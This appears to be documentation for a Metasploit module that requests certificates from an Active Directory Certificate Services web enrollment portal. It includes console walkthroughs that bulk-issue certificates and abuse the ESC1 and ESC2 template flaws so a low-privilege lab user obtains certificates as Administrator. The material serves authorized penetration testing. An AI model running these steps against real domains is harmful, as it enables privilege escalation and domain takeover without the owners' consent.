## Vulnerable Application
This module makes authenticated requests to an Active Directory Certificate Services Web enrollment portal to gain
a list of available templates and/or generate certificates based on the available templates.
This is the same basic action as `auxiliary/server/relay/esc8` but rather then relaying NTLM credentials, we are
authenticating with credentials we have.

## Verification Steps

### NTLM
1. Install and configure the application
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html
2. Start `msfconsole`
2. Do: `use auxiliary/admin/http/web_enrollment_cert`
3. Set the `RHOSTS` option to the AD CS Web Enrollment server
4. Set the `HTTP::Auth` option to `ntlm`
4. Set the `HttpUsername` option to a valid user
4. Set the `HttpPassword` option to a valid user password
4. Set `MODE`, `CERT_TEMPLATE`, and `TARGETURI` to the desired settings.

### Kerberos
1. Install and configure the application
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html
2. Start `msfconsole`
2. Do: `use auxiliary/admin/http/web_enrollment_cert`
3. Set the `RHOSTS` option to the AD CS Web Enrollment server
4. Set the `HTTP::Auth` option to `kerberos`
5. Set the `DOMAIN` option to the FQDN
6. Set the `DomainControllerRhost` if it is not available through DNS
4. Set the `HttpUsername` option to a valid user
4. Set the `HttpPassword` option to a valid user password
4. Set `MODE`, `CERT_TEMPLATE`, and `TARGETURI` to the desired settings.

### ESC1 
1. Install and configure the application with ESC1 vulnerable template
   * https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html
2. Follow steps above based on authentication type
4. Set `MODE` to `SPECIFIC_TEMPLATE`
3. Set `CERT_TEMPLATE` to a template vulnerable to ESC1
4. Set `ALT_UPN` to the desired User
5. Set `ALT_SID` to the desired SID, if necessary
6. Set `ALT_DNS` if required

### ESC2
1. Install and configure the application with ESC2 vulnerable template
    * https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html
2. Follow steps above based on authentication type
4. Set `MODE` to `SPECIFIC_TEMPLATE`
3. Set `CERT_TEMPLATE` to a template vulnerable to ESC2
4. Set `ON_BEHALF_OF` to the desired User
5. Set `PFX` to the desired certificate file

## Options

### MODE
The issue mode. This controls what the module will do once an authenticated session is established to the Web Enrollment
server. Must be one of the following options:

* ALL: Enumerate all available certificate templates and then issue each of them
* QUERY_ONLY: Enumerate all available certificate templates but do not issue any.  Not all certificate templates
  available for use will be displayed; templates with the flag CT_FLAG_MACHINE_TYPE set will not show available and
  include `Machine` (AKA `Computer`) and `DomainController`
* SPECIFIC_TEMPLATE: Issue the certificate template specified in the `CERT_TEMPLATE` option

### CERT_TEMPLATE
The template to issue if MODE is SPECIFIC_TEMPLATE.

## Scenarios

### Windows 2019
#### NTLM with MODE ALL
```msf
msf > use auxiliary/admin/http/web_enrollment_cert 
msf auxiliary(admin/http/web_enrollment_cert) > set rhost 10.5.132.180
rhost => 10.5.132.180
msf auxiliary(admin/http/web_enrollment_cert) > set httpusername Administrator
httpusername => Administrator
msf auxiliary(admin/http/web_enrollment_cert) > set httppassword v3Mpassword
httppassword => v3Mpassword
msf auxiliary(admin/http/web_enrollment_cert) > set DOMAIN EXAMPLE
DOMAIN => EXAMPLE
msf auxiliary(admin/http/web_enrollment_cert) > set MODE ALL 
MODE => ALL
msf auxiliary(admin/http/web_enrollment_cert) > set HTTP::AUTH ntlm 
HTTP::AUTH => ntlm
msf auxiliary(admin/http/web_enrollment_cert) > show options

Module options (auxiliary/admin/http/web_enrollment_cert):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ALT_DNS                        no        Alternative certificate DNS
   ALT_SID                        no        Alternative object SID
   ALT_UPN                        no        Alternative certificate UPN (format: USER@DOMAIN)
   HttpPassword  v3Mpassword      no        The HTTP password to specify for authentication
   HttpUsername  Administrator    no        The HTTP username to specify for authentication
   MODE          ALL              yes       The issue mode. (Accepted: ALL, QUERY_ONLY, SPECIFIC_TEMPLATE)
   ON_BEHALF_OF                   no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                            no        Certificate to request on behalf of
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5
                                            h, sapni, socks4, http, socks5
   RHOSTS        10.5.132.180     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                            metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /certsrv/        yes       The URI for the cert server.
   THREADS       1                yes       The number of concurrent threads (max one per host)
   VHOST                          no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE                   no        The template to issue if MODE is SPECIFIC_TEMPLATE.


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > run
[*] Retrieving available template list, this may take a few minutes
[*] ***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***
[+] Available Certificates for EXAMPLE\\Administrator on : User, EFS, Administrator, EFSRecovery, ESC16_1, ESC2-Template, WebServer, SubCA, ESC1-Template
[+] Certificate generated using template User and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template User saved to /home/tmoose/.msf4/loot/20260116142051_default_10.5.132.180_windows.ad.cs_263748.pfx
[+] Certificate generated using template EFS and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template EFS saved to /home/tmoose/.msf4/loot/20260116142053_default_10.5.132.180_windows.ad.cs_150446.pfx
[+] Certificate generated using template Administrator and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template Administrator saved to /home/tmoose/.msf4/loot/20260116142055_default_10.5.132.180_windows.ad.cs_586273.pfx
[+] Certificate generated using template EFSRecovery and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template EFSRecovery saved to /home/tmoose/.msf4/loot/20260116142057_default_10.5.132.180_windows.ad.cs_077399.pfx
[+] Certificate generated using template ESC16_1 and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template ESC16_1 saved to /home/tmoose/.msf4/loot/20260116142101_default_10.5.132.180_windows.ad.cs_832421.pfx
[+] Certificate generated using template ESC2-Template and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template ESC2-Template saved to /home/tmoose/.msf4/loot/20260116142102_default_10.5.132.180_windows.ad.cs_548200.pfx
[+] Certificate generated using template WebServer and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template WebServer saved to /home/tmoose/.msf4/loot/20260116142103_default_10.5.132.180_windows.ad.cs_191863.pfx
[+] Certificate generated using template SubCA and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template SubCA saved to /home/tmoose/.msf4/loot/20260116142105_default_10.5.132.180_windows.ad.cs_300086.pfx
[+] Certificate generated using template ESC1-Template and EXAMPLE\\Administrator
[+] Certificate for EXAMPLE\\Administrator using template ESC1-Template saved to /home/tmoose/.msf4/loot/20260116142106_default_10.5.132.180_windows.ad.cs_017489.pfx
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf auxiliary(admin/http/web_enrollment_cert) > 

```

#### Kerberos MODE:ALL
```msf
msf auxiliary(admin/http/web_enrollment_cert) > show options

Module options (auxiliary/admin/http/web_enrollment_cert):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ALT_DNS                        no        Alternative certificate DNS
   ALT_SID                        no        Alternative object SID
   ALT_UPN                        no        Alternative certificate UPN (format: USER@DOMAIN)
   HttpPassword  v3Mpassword      no        The HTTP password to specify for authentication
   HttpUsername  Administrator    no        The HTTP username to specify for authentication
   MODE          ALL              yes       The issue mode. (Accepted: ALL, QUERY_ONLY, SPECIFIC_TEMPLATE)
   ON_BEHALF_OF                   no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                            no        Certificate to request on behalf of
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5
                                            h, sapni, socks4, http, socks5
   RHOSTS        10.5.132.180     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                            metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /certsrv/        yes       The URI for the cert server.
   THREADS       1                yes       The number of concurrent threads (max one per host)
   VHOST                          no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE                   no        The template to issue if MODE is SPECIFIC_TEMPLATE.


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > show advanced

Module advanced options (auxiliary/admin/http/web_enrollment_cert):

   Name                     Current Setting                    Required  Description
   ----                     ---------------                    --------  -----------
   DOMAIN                   example.com                        yes       The domain to use for Windows authentication (Must be FQDN
                                                                          if HTTP:Auth is Kerberos)
   DigestAlgorithm          SHA256                             yes       The digest algorithm to use (Accepted: SHA1, SHA256)
   DigestAuthIIS            true                               no        Conform to IIS, should work for most servers. Only set to
                                                                         false for non-IIS servers
   FingerprintCheck         true                               no        Conduct a pre-exploit fingerprint verification
   HTTP::Auth               kerberos                           yes       The Authentication mechanism to use (Accepted: auto, ntlm,
                                                                          kerberos, plaintext, none)
   HttpClientTimeout                                           no        HTTP connection and receive timeout
   HttpRawHeaders                                              no        Path to ERB-templatized raw headers to append to existing
                                                                         headers
   HttpTrace                false                              no        Show the raw HTTP requests and responses
   HttpTraceColors          red/blu                            no        HTTP request and response colors for HttpTrace (unset to d
                                                                         isable)
   HttpTraceHeadersOnly     false                              no        Show HTTP headers only in HttpTrace
   SSLKeyLogFile                                               no        The SSL key log file
   SSLServerNameIndication                                     no        SSL/TLS Server Name Indication (SNI)
   SSLVersion               Auto                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and S
                                                                         SL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3
                                                                         , TLS1, TLS1.1, TLS1.2)
   ShowProgress             true                               yes       Display progress messages during a scan
   ShowProgressPercent      10                                 yes       The interval in percent that progress should be shown
   UserAgent                Mozilla/5.0 (Macintosh; Intel Mac  no        The User-Agent header to use for all requests
                             OS X 10_15_7) AppleWebKit/537.36
                             (KHTML, like Gecko) Chrome/131.0
                            .0.0 Safari/537.36
   VERBOSE                  false                              no        Enable detailed status messages
   WORKSPACE                                                   no        Specify the workspace for this module


   When HTTP::Auth is kerberos:

   Name                            Current Setting                 Required  Description
   ----                            ---------------                 --------  -----------
   DomainControllerRhost           10.5.132.180                    no        The resolvable rhost for the Domain Controller
   HTTP::Krb5Ccname                                                no        The ccache file to use for kerberos authentication
   HTTP::KrbOfferedEncryptionType  AES256,AES128,RC4-HMAC,DES-CBC  yes       Kerberos encryption types to offer
   s                               -MD5,DES3-CBC-SHA1
   HTTP::Rhostname                 WIN-DRC9HCDIMAT                 no        The rhostname which is required for kerberos - the SPN
   KrbCacheMode                    read-write                      yes       Kerberos ticket cache storage mode (Accepted: none, re
                                                                             ad-only, write-only, read-write)


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > run
[*] Retrieving available template list, this may take a few minutes
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143502_default_10.5.132.180_mit.kerberos.cca_557407.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143502_default_10.5.132.180_mit.kerberos.cca_545138.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[*] ***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***
[+] Available Certificates for  on : User, EFS, Administrator, EFSRecovery, ESC16_1, ESC2-Template, WebServer, SubCA, ESC1-Template
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143520_default_10.5.132.180_mit.kerberos.cca_606180.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143520_default_10.5.132.180_mit.kerberos.cca_023162.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template User and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143537_default_10.5.132.180_mit.kerberos.cca_548243.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143537_default_10.5.132.180_mit.kerberos.cca_843349.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template User saved to /home/tmoose/.msf4/loot/20260116143538_default_10.5.132.180_windows.ad.cs_760252.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143541_default_10.5.132.180_mit.kerberos.cca_236912.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143541_default_10.5.132.180_mit.kerberos.cca_237890.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template EFS and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143543_default_10.5.132.180_mit.kerberos.cca_360144.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143543_default_10.5.132.180_mit.kerberos.cca_009299.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template EFS saved to /home/tmoose/.msf4/loot/20260116143544_default_10.5.132.180_windows.ad.cs_150360.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143546_default_10.5.132.180_mit.kerberos.cca_444407.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143547_default_10.5.132.180_mit.kerberos.cca_460069.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template Administrator and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143548_default_10.5.132.180_mit.kerberos.cca_941754.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143549_default_10.5.132.180_mit.kerberos.cca_484741.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template Administrator saved to /home/tmoose/.msf4/loot/20260116143549_default_10.5.132.180_windows.ad.cs_088506.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143552_default_10.5.132.180_mit.kerberos.cca_665940.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143552_default_10.5.132.180_mit.kerberos.cca_324874.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template EFSRecovery and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143554_default_10.5.132.180_mit.kerberos.cca_559229.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143554_default_10.5.132.180_mit.kerberos.cca_295382.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template EFSRecovery saved to /home/tmoose/.msf4/loot/20260116143554_default_10.5.132.180_windows.ad.cs_477946.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143556_default_10.5.132.180_mit.kerberos.cca_645978.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143557_default_10.5.132.180_mit.kerberos.cca_838211.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template ESC16_1 and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143558_default_10.5.132.180_mit.kerberos.cca_485891.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143559_default_10.5.132.180_mit.kerberos.cca_709913.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template ESC16_1 saved to /home/tmoose/.msf4/loot/20260116143559_default_10.5.132.180_windows.ad.cs_818976.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143601_default_10.5.132.180_mit.kerberos.cca_952232.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143601_default_10.5.132.180_mit.kerberos.cca_169000.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template ESC2-Template and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143603_default_10.5.132.180_mit.kerberos.cca_042983.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143603_default_10.5.132.180_mit.kerberos.cca_512322.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template ESC2-Template saved to /home/tmoose/.msf4/loot/20260116143604_default_10.5.132.180_windows.ad.cs_206522.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143607_default_10.5.132.180_mit.kerberos.cca_893032.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143607_default_10.5.132.180_mit.kerberos.cca_156631.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template WebServer and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143608_default_10.5.132.180_mit.kerberos.cca_982799.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143609_default_10.5.132.180_mit.kerberos.cca_247412.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template WebServer saved to /home/tmoose/.msf4/loot/20260116143609_default_10.5.132.180_windows.ad.cs_955795.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143612_default_10.5.132.180_mit.kerberos.cca_119902.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143613_default_10.5.132.180_mit.kerberos.cca_847610.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template SubCA and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143614_default_10.5.132.180_mit.kerberos.cca_417480.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143615_default_10.5.132.180_mit.kerberos.cca_766015.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template SubCA saved to /home/tmoose/.msf4/loot/20260116143615_default_10.5.132.180_windows.ad.cs_888697.pfx
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143617_default_10.5.132.180_mit.kerberos.cca_866496.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143617_default_10.5.132.180_mit.kerberos.cca_528295.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template ESC1-Template and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143619_default_10.5.132.180_mit.kerberos.cca_103101.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116143619_default_10.5.132.180_mit.kerberos.cca_871753.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template ESC1-Template saved to /home/tmoose/.msf4/loot/20260116143620_default_10.5.132.180_windows.ad.cs_135453.pfx
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/http/web_enrollment_cert) > 

```

# Kerberos, ESC1
```msf
msf auxiliary(admin/http/web_enrollment_cert) > set MODE QUERY_ONLY 
MODE => QUERY_ONLY
msf auxiliary(admin/http/web_enrollment_cert) > run
[*] Retrieving available template list, this may take a few minutes
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116144412_default_10.5.132.180_mit.kerberos.cca_605997.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116144413_default_10.5.132.180_mit.kerberos.cca_011223.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[*] ***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***
[+] Available Certificates for  on : User, EFS, Administrator, EFSRecovery, ESC16_1, ESC2-Template, WebServer, SubCA, ESC1-Template
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/http/web_enrollment_cert) > set httpusername msfuser
httpusername => msfuser
msf auxiliary(admin/http/web_enrollment_cert) > set httppassword v3Mpassword
httppassword => v3Mpassword
msf auxiliary(admin/http/web_enrollment_cert) > set mode SPECIFIC_TEMPLATE 
mode => SPECIFIC_TEMPLATE
msf auxiliary(admin/http/web_enrollment_cert) > set cert_template ESC1-Template
cert_template => ESC1-Template
msf auxiliary(admin/http/web_enrollment_cert) > set ALT_UPN Administrator@example.com
ALT_UPN => Administrator@example.com
msf auxiliary(admin/http/web_enrollment_cert) > run
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116144915_default_10.5.132.180_mit.kerberos.cca_142147.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116144915_default_10.5.132.180_mit.kerberos.cca_645508.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template ESC1-Template and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116144917_default_10.5.132.180_mit.kerberos.cca_079562.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116144917_default_10.5.132.180_mit.kerberos.cca_912221.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template ESC1-Template saved to /home/tmoose/.msf4/loot/20260116144918_default_10.5.132.180_windows.ad.cs_076676.pfx
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/http/web_enrollment_cert) > 


```

# Kerberos, ESC2
```msf
msf auxiliary(admin/http/web_enrollment_cert) > show options

Module options (auxiliary/admin/http/web_enrollment_cert):

   Name          Current Setting            Required  Description
   ----          ---------------            --------  -----------
   ALT_DNS                                  no        Alternative certificate DNS
   ALT_SID                                  no        Alternative object SID
   ALT_UPN       Administrator@example.com  no        Alternative certificate UPN (format: USER@DOMAIN)
   HttpPassword  v3Mpassword                no        The HTTP password to specify for authentication
   HttpUsername  msfuser                    no        The HTTP username to specify for authentication
   MODE          SPECIFIC_TEMPLATE          yes       The issue mode. (Accepted: ALL, QUERY_ONLY, SPECIFIC_TEMPLATE)
   ON_BEHALF_OF                             no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                      no        Certificate to request on behalf of
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxi
                                                      es: socks5h, sapni, socks4, http, socks5
   RHOSTS        10.5.132.180               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
                                                      ics/using-metasploit.html
   RPORT         80                         yes       The target port (TCP)
   SSL           false                      no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /certsrv/                  yes       The URI for the cert server.
   THREADS       1                          yes       The number of concurrent threads (max one per host)
   VHOST                                    no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE  ESC1-Template    no        The template to issue if MODE is SPECIFIC_TEMPLATE.


View the full module info with the info, or info -d command.

msf auxiliary(admin/http/web_enrollment_cert) > set CERT_TEMPLATE User
CERT_TEMPLATE => User
msf auxiliary(admin/http/web_enrollment_cert) > unset ALT_UPN 
Unsetting ALT_UPN...
msf auxiliary(admin/http/web_enrollment_cert) > run
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116150908_default_10.5.132.180_mit.kerberos.cca_798433.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116150908_default_10.5.132.180_mit.kerberos.cca_355039.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template User and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116150910_default_10.5.132.180_mit.kerberos.cca_649135.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116150910_default_10.5.132.180_mit.kerberos.cca_950645.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate for  using template User saved to /home/tmoose/.msf4/loot/20260116150911_default_10.5.132.180_windows.ad.cs_854591.pfx
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/http/web_enrollment_cert) > set PFX /home/tmoose/.msf4/loot/20260116150911_default_10.5.132.180_windows.ad.cs_854591.pfx
PFX => /home/tmoose/.msf4/loot/20260116150911_default_10.5.132.180_windows.ad.cs_854591.pfx
msf auxiliary(admin/http/web_enrollment_cert) > set ON_BEHALF_OF EXAMPLE\\Administrator
ON_BEHALF_OF => EXAMPLE\Administrator
msf auxiliary(admin/http/web_enrollment_cert) > set cert_template User
cert_template => User
msf auxiliary(admin/http/web_enrollment_cert) > run
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116151145_default_10.5.132.180_mit.kerberos.cca_970115.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116151145_default_10.5.132.180_mit.kerberos.cca_854009.bin
[+] 10.5.132.180:88 - Received a valid delegation TGS-Response
[+] Certificate generated using template User and 
[+] 10.5.132.180:88 - Received a valid TGT-Response
[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20260116151147_default_10.5.132.180_mit.kerberos.cca_332600.bin
[+] 10.5.132.180:88 - Received a valid TGS-Response
